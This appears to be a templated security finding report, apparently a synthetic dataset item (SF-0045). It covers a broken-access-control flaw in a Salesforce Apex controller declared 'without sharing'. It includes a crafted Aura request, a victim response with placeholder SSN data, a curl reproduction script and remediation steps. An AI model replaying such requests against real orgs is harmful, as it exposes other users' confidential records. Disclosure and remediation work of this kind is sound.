# Security Analysis Report
**System:** InsightGraph Analytics API (Salesforce-Integrated)
**Domain:** Data Analytics
**Example ID:** SF-0045
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `AccountController.getAccounts` — attacker reads any analytics Account record |

---

## Finding 1 — BAC: Functional Pivot on Account Object (Pattern 2.1)

### Summary
The Apex controller `AccountController` on InsightGraph Analytics API (`29fb1527.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 2.1, the attacker performs a functional pivot: using the existing `getAccounts` action to access Account records beyond their authorised scope. No SOQL ownership predicate prevents this. In a data analytics context, Account records may represent data pipeline configurations, analytics workspace settings, and analyst PII.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://29fb1527.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://29fb1527.lightning.force.com/aura
Authorization: Bearer 00D29FB1527!AR29fb1527...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D29FB1527!AR29fb1527...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"0011527","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Analytics Account Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0011527", "Name": "Victim Account Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-34-5864"
  }] }, "error": [] }]
}
```

### Evidence Map

| Artifact | Value | Significance |
|---|---|---|
| §4.0 `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 2.1 | Functional pivot | Pivot from own records to victim's |
| §7.0 OWD Account: Private | Sharing config | Only owner should access |
| §8.0 RISK-SF-045 | No `with sharing` | Sharing rules not enforced |
| §8.0 RISK-SF-046 | No ownership predicate | Any `accountId` accepted |
| HAR `accountId` | `0011527` | Victim analytics Account record |
| HAR `SensitiveData__c` | `SSN: 000-34-5864` | Analytics operator PII |

### Steps to Reproduce

```bash
SESSION="00D29FB1527!AR29fb1527..."
curl -s -X POST "https://29fb1527.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"0011527","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Expected (vulnerable): state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-34-5864
# Expected (secure): state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class AccountController { ... }`
2. `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
